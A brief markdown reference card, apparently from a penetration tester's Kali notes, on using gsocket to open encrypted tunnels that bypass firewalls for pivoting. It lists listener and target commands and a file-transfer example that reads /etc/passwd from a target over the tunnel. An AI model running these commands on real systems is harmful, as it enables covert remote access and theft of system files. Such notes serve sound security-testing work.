---
tags: [tool, pivoting]
tool: gsocket
category: Pivoting
installed: true
---

# Gsocket - Firewall Bypass

## Overview
Create encrypted tunnels through any firewall without port forwarding

## Location
/usr/bin/gsocket

## Usage

### On Kali (Listener)
gsocket -s
cat ~/.gsocket/secret

### On Target (Connect)
gsocket -q YOUR_SECRET

### Transfer files
gsocket -q YOUR_SECRET -c "cat /etc/passwd" > passwd.txt
